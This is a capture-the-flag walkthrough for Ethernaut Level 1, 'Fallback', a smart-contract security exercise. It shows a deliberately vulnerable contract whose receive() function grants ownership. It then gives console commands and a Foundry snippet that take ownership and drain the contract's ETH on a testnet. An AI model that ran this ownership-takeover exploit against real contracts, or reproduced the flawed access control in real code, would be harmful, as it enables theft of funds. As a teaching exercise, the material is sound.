# Fallback – Level 1 Walkthrough

Welcome to the first level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on fallback function vulnerabilities.

---

## Challenge Objective

You are given a contract with a fallback function that can be exploited. Your goal is to:

- Become the contract owner by exploiting the fallback logic
- Withdraw the contract's ETH balance
- Submit the instance to complete the level

---

## Prerequisites

Before you begin, ensure the following:

- **MetaMask** is installed and connected
- **Test ETH** is available (Goerli, Sepolia, etc.)
- Familiarity with using **browser DevTools** and executing JavaScript commands
- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

## Contract Overview

Key parts of the `Fallback.sol` contract:

```solidity
mapping(address => uint) public contributions;
address public owner;

function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}

function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

---

## Walkthrough – Step by Step

### 🗒️ Step 1: Check the Current Owner (Optional)

```js
await contract.owner()
```
> The owner is likely not your address yet.

---

### 🛠️ Step 2: Make a Small Contribution

```js
await contract.contribute({ value: "1" }) // 1 wei is enough
```
> This registers your address with a nonzero contribution.

---

### 🔍 Step 3: Trigger the Fallback

```js
await contract.sendTransaction({ value: "1" })
```
> This calls the `receive()` function, which checks your contribution and sets you as the owner.

---

### ✅ Step 4: Confirm Ownership

```js
await contract.owner()
```
> The owner should now be your address.

---

### 💸 Step 5: Withdraw All ETH

```js
await contract.withdraw()
```
> As the new owner, you can drain the contract's balance.

---

### 🚀 Step 6: Submit the Level

Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.

---

## 🛠️ Alternative: Using Foundry Script

You can automate the exploit with a script:

```solidity
fallbackInstance.contribute{ value: 1 wei }();
address(fallbackInstance).call{ value: 1 wei }("");
fallbackInstance.withdraw();
```

---

## 💡 What You Learn

- How fallback and receive functions can be abused
- The importance of contribution checks in contract logic
- How to claim ownership by exploiting fallback logic
- The risks of improper access control in smart contracts

---

## Concepts Covered

| Concept             | Description                                                                  |
| ------------------- | ---------------------------------------------------------------------------- |
| Fallback Functions  | Special functions triggered by direct ETH transfers                          |
| Ownership Takeover  | Ownership can change via fallback if contribution conditions are met         |
| Withdrawal Patterns | Only the owner can withdraw contract funds                                   |
| Web3 Interaction    | Using injected contract instances and console JS to interact                 |

---

## Resources

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [YouTube Walkthrough](https://www.youtube.com/watch?v=TQKj2xvsGec)
- [blog](https://shubhamm.me/blog/08-ethernaut-challenges-fallback)

---
